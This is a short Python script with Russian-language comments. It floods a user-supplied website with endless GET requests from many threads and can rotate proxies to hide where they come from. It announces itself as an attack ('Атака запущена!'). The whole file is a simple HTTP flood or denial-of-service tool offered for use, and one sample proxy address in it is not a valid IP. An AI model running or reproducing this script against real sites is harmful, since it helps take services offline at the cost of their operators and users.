import requests
import time
from concurrent.futures import ThreadPoolExecutor
import random

# Конфигурация прокси (можно добавить свои)
PROXY_LIST = [
    "http://123.45.67.89:8080",
    "socks5://111.222.333.444:9050",
    # Добавьте свои прокси или оставьте пустым для работы без них
]

def get_random_proxy():
    if not PROXY_LIST:
        return None
    return random.choice(PROXY_LIST)

def bot_action(target_url, proxy):
    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    try:
        response = session.get(target_url, timeout=5)
        print(f"[+] Бот зашел | Статус: {response.status_code} | Прокси: {proxy}")
    except Exception as e:
        print(f"[-] Ошибка: {e}")

if __name__ == "__main__":
    target_url = input("Введите URL сайта (например, http://example.com): ")
    num_bots = int(input("Количество ботов: "))
    
    print("\n⚡ Атака запущена! (Ctrl+C для остановки)")
    with ThreadPoolExecutor(max_workers=num_bots) as executor:
        while True:
            proxy = get_random_proxy()
            executor.submit(bot_action, target_url, proxy)
            time.sleep(0.1)  # Интервал между запросами
